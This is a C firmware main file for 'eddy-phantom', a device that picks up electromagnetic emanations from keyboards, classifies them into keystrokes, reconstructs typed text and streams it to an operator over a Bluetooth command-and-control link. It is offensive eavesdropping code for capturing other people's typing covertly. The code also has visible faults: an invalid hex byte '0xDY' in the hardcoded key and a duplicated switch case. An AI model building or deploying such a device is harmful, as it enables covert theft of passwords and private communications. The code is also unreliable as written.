/*
 * eddy-phantom — main.c
 * Main application logic and state machine for the
 * Electromagnetic Emanation Keyboard Reconnaissance Device.
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * Build: make
 * Target: STM32H743VIT6 (Cortex-M7 @ 480 MHz)
 *
 * The main loop implements a state machine:
 *   BOOT → IDLE → ARMED → (trigger) → CAPTURE → IDLE
 *                       → (button)   → IDLE
 *   IDLE → (calibrate cmd) → CALIBRATE → IDLE
 */

#include "board.h"
#include "registers.h"

/* ── Driver function prototypes ───────────────────────────────── */
extern void board_init_clock(void);
extern void board_init_gpio(void);
extern void board_init_fmc_sdram(void);
extern void board_init_qspi(void);
extern void board_init_exti(void);

extern int  adc_init(void);
extern int  adc_start_capture(int16_t *buf, uint32_t samples);
extern int  adc_read_burst(int16_t *buf, uint32_t samples);
extern void adc_set_range(int range_5v);
extern void adc_reset(void);

extern void probe_init(void);
extern void probe_set_gain(uint8_t channel, uint16_t gain_db_tenths);
extern void probe_auto_range(int16_t *sample_buf, uint16_t *gain_out);
extern void probe_set_filter_cutoff(uint32_t cutoff_hz);

extern void dsp_init(void);
extern int  dsp_process_burst(int16_t *raw, uint16_t *gain, float *features);
extern void dsp_bandpass_filter(float *signal, int len);
extern void dsp_compute_mfcc(float *signal, int len, float *mfcc_out);
extern void dsp_compute_envelope(float *signal, int len, float *env_out);

extern int  classifier_init(void);
extern int  classifier_infer(float *features, uint8_t *scancode, uint8_t *confidence);
extern int  classifier_load_profile(uint32_t qspi_offset);
extern int  classifier_calibrate_start(const char *name, uint16_t controller_id);
extern int  classifier_calibrate_add_key(uint8_t scancode, float *features);
extern int  classifier_calibrate_finish(void);

extern int  sdcard_init(void);
extern int  sdcard_log_burst(burst_record_t *rec);
extern int  sdcard_log_session(const char *text, uint32_t len);
extern int  sdcard_list_profiles(void);
extern int  sdcard_load_profile(const char *name, keyboard_profile_t *prof);

extern int  sdram_init(void);
extern int  sdram_alloc_burst_slot(uint32_t *slot_idx);
extern int  sdram_store_burst(uint32_t slot_idx, burst_record_t *rec);
extern int  sdram_get_burst(uint32_t slot_idx, burst_record_t *rec);
extern void sdram_free_burst_slot(uint32_t slot_idx);

extern int  qspi_init(void);
extern int  qspi_read(uint32_t addr, void *buf, uint32_t len);
extern int  qspi_write_page(uint32_t addr, const void *buf, uint32_t len);
extern int  qspi_erase_sector(uint32_t addr);

extern int  ble_init(void);
extern int  ble_send_key(uint8_t scancode, uint8_t confidence, uint32_t ts);
extern int  ble_send_status(uint8_t state, uint8_t battery, const char *info);
extern int  ble_recv_cmd(uint8_t *cmd, void *payload, uint16_t *len);
extern int  ble_authenticate(const uint8_t *psk, uint32_t len);
extern void ble_process(void);

extern void oled_init(void);
extern void oled_clear(void);
extern void oled_draw_string(int x, int y, const char *str, int size);
extern void oled_draw_status(int armed, int battery, const char *profile);
extern void oled_refresh(void);

/* ── Global state ─────────────────────────────────────────────── */
static volatile device_state_t g_state = STATE_BOOT;
static volatile uint32_t g_systick_ms = 0;
static volatile uint8_t  g_trigger_flag = 0;     /* set by EXTI ISR */
static volatile uint8_t  g_button_flag = 0;      /* set by EXTI ISR */
static volatile uint8_t  g_ble_cmd_flag = 0;     /* set by USART ISR */

static keyboard_profile_t g_profile;
static burst_record_t     g_current_burst;
static float              g_feature_buf[DSP_FEATURE_DIM];

/* Text reconstruction buffer */
#define TEXT_BUF_SIZE 512
static char     g_text_buf[TEXT_BUF_SIZE];
static uint16_t g_text_len = 0;
static uint8_t  g_shift_state = 0;  /* bitmask: bit0=LSHIFT, bit1=RSHIFT, bit2=CTRL, bit3=ALT */

/* BLE pre-shared key (in production, stored in backup registers / OTP) */
static const uint8_t g_ble_psk[BLE_PSKEY_LEN] = {
    0xED, 0xDY, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05,
    0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D,
    0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
    0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D
};

/* ── Scancode to ASCII mapping (USB HID Usage Table, partial) ── */
static const char scancode_ascii_map[128] = {
    [0x04]='a', [0x05]='b', [0x06]='c', [0x07]='d', [0x08]='e',
    [0x09]='f', [0x0A]='g', [0x0B]='h', [0x0C]='i', [0x0D]='j',
    [0x0E]='k', [0x0F]='l', [0x10]='m', [0x11]='n', [0x12]='o',
    [0x13]='p', [0x14]='q', [0x15]='r', [0x16]='s', [0x17]='t',
    [0x18]='u', [0x19]='v', [0x1A]='w', [0x1B]='x', [0x1C]='y',
    [0x1D]='z', [0x1E]='1', [0x1F]='2', [0x20]='3', [0x21]='4',
    [0x22]='5', [0x23]='6', [0x24]='7', [0x25]='8', [0x26]='9',
    [0x27]='0', [0x28]='\n', [0x29]=0x1B, /* ESC */
    [0x2A]=0x08, /* Backspace */
    [0x2B]='\t', [0x2C]=' ', [0x2D]='-', [0x2E]='=', [0x2F]='[',
    [0x30]=']', [0x31]='\\', [0x33]=';', [0x34]='\'', [0x35]='`',
    [0x36]=',', [0x37]='.', [0x38]='/',
};

static const char scancode_shift_map[128] = {
    [0x04]='A', [0x05]='B', [0x06]='C', [0x07]='D', [0x08]='E',
    [0x09]='F', [0x0A]='G', [0x0B]='H', [0x0C]='I', [0x0D]='J',
    [0x0E]='K', [0x0F]='L', [0x10]='M', [0x11]='N', [0x12]='O',
    [0x13]='P', [0x14]='Q', [0x15]='R', [0x16]='S', [0x17]='T',
    [0x18]='U', [0x19]='V', [0x1A]='W', [0x1B]='X', [0x1C]='Y',
    [0x1D]='Z', [0x1E]='!', [0x1F]='@', [0x20]='#', [0x21]='$',
    [0x22]='%', [0x23]='^', [0x24]='&', [0x25]='*', [0x26]='(',
    [0x27]=')', [0x28]='\n', [0x2C]=' ', [0x2D]='_', [0x2E]='+',
    [0x2F]='{', [0x30]='}', [0x31]='|', [0x33]=':', [0x34]='"',
    [0x35]='~', [0x36]='<', [0x37]='>', [0x38]='?',
};

/* ── SysTick handler ──────────────────────────────────────────── */
void SysTick_Handler(void) {
    g_systick_ms++;
}

uint32_t board_millis(void) {
    return g_systick_ms;
}

void board_delay_ms(uint32_t ms) {
    uint32_t start = g_systick_ms;
    while ((g_systick_ms - start) < ms) {
        /* wait */
    }
}

/* ── EXTI interrupt handlers ──────────────────────────────────── */
void EXTI4_IRQHandler(void) {
    /* Trigger comparator (PC4) — falling edge = burst detected */
    if (EXTI->PR1 & (1U << 4)) {
        EXTI->PR1 = (1U << 4);  /* clear pending */
        g_trigger_flag = 1;
    }
}

void EXTI15_10_IRQHandler(void) {
    /* Arm button (PB14) — falling edge */
    if (EXTI->PR1 & (1U << 14)) {
        EXTI->PR1 = (1U << 14);
        g_button_flag = 1;
    }
}

/* ── Text reconstruction ──────────────────────────────────────── */
static void text_append_char(char c) {
    if (g_text_len < TEXT_BUF_SIZE - 1) {
        g_text_buf[g_text_len++] = c;
        g_text_buf[g_text_len] = '\0';
    } else {
        /* Buffer full — shift left by half */
        uint16_t half = TEXT_BUF_SIZE / 2;
        for (uint16_t i = 0; i < half; i++)
            g_text_buf[i] = g_text_buf[i + half];
        g_text_len = half;
        g_text_buf[g_text_len++] = c;
        g_text_buf[g_text_len] = '\0';
    }
}

static void text_handle_scancode(uint8_t scancode) {
    /* Modifier keys */
    switch (scancode) {
    case 0xE0: g_shift_state |= 0x01; return; /* Left Shift */
    case 0xE4: g_shift_state |= 0x02; return; /* Right Shift */
    case 0xE0+4: g_shift_state &= ~0x01; return; /* L-Shift release (simplified) */
    case 0xE1: g_shift_state |= 0x04; return; /* Left Ctrl */
    case 0xE2: g_shift_state |= 0x08; return; /* Left Alt */
    default: break;
    }

    if (scancode >= 128) return;  /* out of range */

    char c;
    if (g_shift_state & 0x03) {
        c = scancode_shift_map[scancode];
    } else {
        c = scancode_ascii_map[scancode];
    }

    if (c == 0) return;  /* unmapped */

    if (c == 0x08) {
        /* Backspace — remove last char */
        if (g_text_len > 0) {
            g_text_len--;
            g_text_buf[g_text_len] = '\0';
        }
    } else {
        text_append_char(c);
    }
}

/* ── Burst processing pipeline ────────────────────────────────── */
static int process_burst(burst_record_t *burst) {
    uint16_t gain[4];
    uint8_t  scancode = 0;
    uint8_t  confidence = 0;

    /* Auto-range probes based on first few samples */
    probe_auto_range(burst->samples, gain);
    for (int i = 0; i < 4; i++)
        burst->vga_gain[i] = gain[i];

    /* Run DSP pipeline: filter, envelope, MFCC, features */
    if (dsp_process_burst(burst->samples, gain, g_feature_buf) != 0) {
        return -1;
    }

    /* Run classifier */
    if (classifier_infer(g_feature_buf, &scancode, &confidence) != 0) {
        burst->classified = 0;
        burst->scancode = 0;
        burst->confidence = 0;
        return -1;
    }

    burst->classified = 1;
    burst->scancode = scancode;
    burst->confidence = confidence;

    /* If confidence above threshold, add to text buffer */
    if (confidence >= CLS_CONF_THRESHOLD) {
        text_handle_scancode(scancode);
    }

    /* Log to SD card */
    sdcard_log_burst(burst);

    /* Stream to BLE C2 */
    ble_send_key(scancode, confidence, burst->timestamp_ms);

    return 0;
}

/* ── Command handler ──────────────────────────────────────────── */
static void handle_ble_command(void) {
    uint8_t cmd;
    uint8_t payload[180];
    uint16_t len = 0;

    if (ble_recv_cmd(&cmd, payload, &len) != 0)
        return;

    switch (cmd) {
    case BLE_CMD_ARM:
        if (g_state == STATE_IDLE) {
            g_state = STATE_ARMED;
            gpio_set(GPIO(B), LED_CAPTURE_PIN);
            oled_draw_status(1, 0, g_profile.name);
            oled_refresh();
            ble_send_status(STATE_ARMED, 0, "ARMED");
        }
        break;

    case BLE_CMD_DISARM:
        if (g_state == STATE_ARMED) {
            g_state = STATE_IDLE;
            gpio_clr(GPIO(B), LED_CAPTURE_PIN);
            oled_draw_status(0, 0, g_profile.name);
            oled_refresh();
            ble_send_status(STATE_IDLE, 0, "DISARMED");
        }
        break;

    case BLE_CMD_SET_PROFILE: {
        if (len > 0 && len <= PROFILE_NAME_LEN) {
            char name[PROFILE_NAME_LEN];
            for (uint16_t i = 0; i < len && i < PROFILE_NAME_LEN - 1; i++)
                name[i] = payload[i];
            name[len < PROFILE_NAME_LEN ? len : PROFILE_NAME_LEN - 1] = '\0';
            if (sdcard_load_profile(name, &g_profile) == 0) {
                classifier_load_profile(g_profile.ref_offset);
                ble_send_status(g_state, 0, g_profile.name);
                oled_draw_status(g_state == STATE_ARMED, 0, g_profile.name);
                oled_refresh();
            }
        }
        break;
    }

    case BLE_CMD_SET_THRESH: {
        if (len >= 1) {
            /* payload[0] = new threshold (0-100) */
            extern void classifier_set_threshold(uint8_t thresh);
            classifier_set_threshold(payload[0]);
        }
        break;
    }

    case BLE_CMD_REQ_BURST: {
        if (len >= 4) {
            uint32_t idx = payload[0] | (payload[1]<<8) |
                           (payload[2]<<16) | (payload[3]<<24);
            burst_record_t rec;
            if (sdram_get_burst(idx, &rec) == 0) {
                /* Send in chunks via BLE */
                /* ... chunked transfer handled in ble_c2.c ... */
            }
        }
        break;
    }

    case BLE_CMD_CAL_START: {
        if (len >= 2) {
            uint16_t ctrl_id = payload[0] | (payload[1] << 8);
            classifier_calibrate_start("custom", ctrl_id);
            g_state = STATE_CALIBRATE;
            oled_draw_string(0, 20, "CALIBRATE MODE", 1);
            oled_refresh();
        }
        break;
    }

    case BLE_CMD_CAL_KEY: {
        if (g_state == STATE_CALIBRATE && len >= 1) {
            uint8_t key = payload[0];
            /* Capture a burst and add to calibration set */
            if (adc_read_burst(g_current_burst.samples, BURST_SAMPLES) == 0) {
                float feat[DSP_FEATURE_DIM];
                dsp_process_burst(g_current_burst.samples,
                                  g_current_burst.vga_gain, feat);
                classifier_calibrate_add_key(key, feat);
            }
        }
        break;
    }

    case BLE_CMD_CAL_FINISH: {
        if (g_state == STATE_CALIBRATE) {
            classifier_calibrate_finish();
            g_state = STATE_IDLE;
            oled_draw_string(0, 20, "CAL COMPLETE", 1);
            oled_refresh();
        }
        break;
    }

    case BLE_CMD_AUTH: {
        if (len >= BLE_PSKEY_LEN) {
            ble_authenticate(payload, len);
        }
        break;
    }

    default:
        break;
    }
}

/* ── Button handler ───────────────────────────────────────────── */
static void handle_button(void) {
    g_button_flag = 0;
    board_delay_ms(50);  /* debounce */

    if (gpio_get(GPIO(B), BTN_ARM_PIN) == 0) {  /* still pressed */
        if (g_state == STATE_IDLE) {
            g_state = STATE_ARMED;
            gpio_set(GPIO(B), LED_CAPTURE_PIN);
            oled_draw_status(1, 0, g_profile.name);
            oled_refresh();
        } else if (g_state == STATE_ARMED) {
            g_state = STATE_IDLE;
            gpio_clr(GPIO(B), LED_CAPTURE_PIN);
            oled_draw_status(0, 0, g_profile.name);
            oled_refresh();
        }
    }
}

/* ── Battery monitoring (MAX17048 via I2C) ────────────────────── */
static uint8_t read_battery_percent(void) {
    /* Simplified: read MAX17048 register 0x04 (SOC) via bit-banged I2C
     * In full implementation, this uses the I2C driver in oled.c
     * (shared bus). Returns 0-100 percent.
     */
    extern uint8_t i2c_read_battery(void);
    return i2c_read_battery();
}

/* ── Main ─────────────────────────────────────────────────────── */
int main(void) {
    /* ── Phase 1: Boot & board initialization ── */
    g_state = STATE_BOOT;

    board_init_clock();
    board_init_gpio();
    board_init_fmc_sdram();
    board_init_qspi();
    board_init_exti();

    /* SysTick: 1 ms tick at 480 MHz */
    SYSTICK->LOAD = 480000 - 1;  /* 480 MHz / 1000 Hz = 480000 */
    SYSTICK->VAL = 0;
    SYSTICK->CTRL = SYSTICK_CTRL_ENABLE | SYSTICK_CTRL_TICKINT | SYSTICK_CTRL_CLKSRC;

    /* Enable FPU (CP10, CP11 full access) */
    SCB->CPACR |= SCB_CPACR_CP10_FULL | SCB_CPACR_CP11_FULL;

    /* ── Phase 2: Peripheral initialization ── */
    oled_init();
    oled_clear();
    oled_draw_string(0, 0, "EDDY-PHANTOM", 2);
    oled_draw_string(0, 16, "booting...", 1);
    oled_refresh();

    /* Analog front-end */
    probe_init();
    adc_init();
    adc_set_range(1);  /* ±5V range */
    probe_set_filter_cutoff(DSP_BANDPASS_HIGH_HZ);

    /* DSP & classifier */
    dsp_init();
    classifier_init();

    /* Storage */
    sdram_init();
    qspi_init();
    sdcard_init();

    /* BLE C2 */
    ble_init();
    ble_authenticate(g_ble_psk, BLE_PSKEY_LEN);

    /* ── Phase 3: Load default profile ── */
    oled_draw_string(0, 28, "loading profile...", 1);
    oled_refresh();

    /* Try to load default profile from SD card */
    if (sdcard_load_profile("holtek-ht82k629a", &g_profile) == 0) {
        classifier_load_profile(g_profile.ref_offset);
    } else if (sdcard_load_profile("cypress-cy7c63743", &g_profile) == 0) {
        classifier_load_profile(g_profile.ref_offset);
    } else {
        /* No profile loaded — device works but classification will
           be poor until a profile is loaded */
        g_profile.name[0] = '\0';
        g_profile.num_keys = 0;
    }

    /* ── Phase 4: Enter main loop ── */
    g_state = STATE_IDLE;
    gpio_set(GPIO(B), LED_STATUS_PIN);  /* power OK */

    oled_clear();
    oled_draw_string(0, 0, "EDDY-PHANTOM", 2);
    if (g_profile.name[0])
        oled_draw_string(0, 16, g_profile.name, 1);
    else
        oled_draw_string(0, 16, "no profile", 1);
    oled_draw_string(0, 28, "IDLE", 1);
    oled_refresh();

    ble_send_status(STATE_IDLE, read_battery_percent(), "READY");

    uint32_t last_battery_update = 0;
    uint32_t last_status_update = 0;

    while (1) {
        /* ── Check for trigger (burst detected) ── */
        if (g_trigger_flag && g_state == STATE_ARMED) {
            g_trigger_flag = 0;
            g_state = STATE_CAPTURE;

            /* Capture burst via DMA */
            g_current_burst.timestamp_ms = board_millis();
            g_current_burst.trigger_channel = 0;

            if (adc_read_burst(g_current_burst.samples, BURST_SAMPLES) == 0) {
                /* Store in SDRAM ring buffer */
                uint32_t slot;
                if (sdram_alloc_burst_slot(&slot) == 0) {
                    process_burst(&g_current_burst);
                    sdram_store_burst(slot, &g_current_burst);
                } else {
                    /* SDRAM full — process without storing */
                    process_burst(&g_current_burst);
                }
            }

            g_state = STATE_ARMED;
        }

        /* ── Check for button press ── */
        if (g_button_flag) {
            handle_button();
        }

        /* ── Check for BLE commands ── */
        if (g_ble_cmd_flag) {
            g_ble_cmd_flag = 0;
            handle_ble_command();
        }

        /* Process BLE UART */
        ble_process();

        /* ── Periodic status updates ── */
        uint32_t now = board_millis();
        if (now - last_battery_update > 5000) {  /* every 5s */
            last_battery_update = now;
            uint8_t batt = read_battery_percent();
            if (now - last_status_update > 10000) {  /* every 10s */
                last_status_update = now;
                ble_send_status((uint8_t)g_state, batt, g_profile.name);
            }
        }

        /* ── Calibration mode ── */
        if (g_state == STATE_CALIBRATE) {
            /* In calibration mode, bursts are captured on trigger
             * and associated with the key specified via BLE_CMD_CAL_KEY.
             * The trigger still fires; we just process differently. */
            if (g_trigger_flag) {
                g_trigger_flag = 0;
                if (adc_read_burst(g_current_burst.samples, BURST_SAMPLES) == 0) {
                    /* Feature extraction done in handle_ble_command for CAL_KEY */
                }
            }
        }

        /* ── Error state ── */
        if (g_state == STATE_ERROR) {
            gpio_set(GPIO(B), LED_CAPTURE_PIN);
            board_delay_ms(200);
            gpio_clr(GPIO(B), LED_CAPTURE_PIN);
            board_delay_ms(200);
        }
    }

    return 0;  /* never reached */
}

/* ── USART3 IRQ handler (BLE data received) ───────────────────── */
void USART3_IRQHandler(void) {
    if (USART(3)->ISR & USART_ISR_RXNE) {
        (void)USART(3)->RDR;  /* read to clear flag, data handled in ble_process */
        g_ble_cmd_flag = 1;
    }
}

/* ── DMA1 Stream0 IRQ (ADC DMA transfer complete) ─────────────── */
void DMA1_Stream0_IRQHandler(void) {
    if (((dma_regs_t *)DMA1_BASE)->LISR & DMA_TCIF0) {
        /* Transfer complete flag — handled in adc_capture.c */
        ((dma_regs_t *)DMA1_BASE)->LIFCR = DMA_TCIF0;
    }
}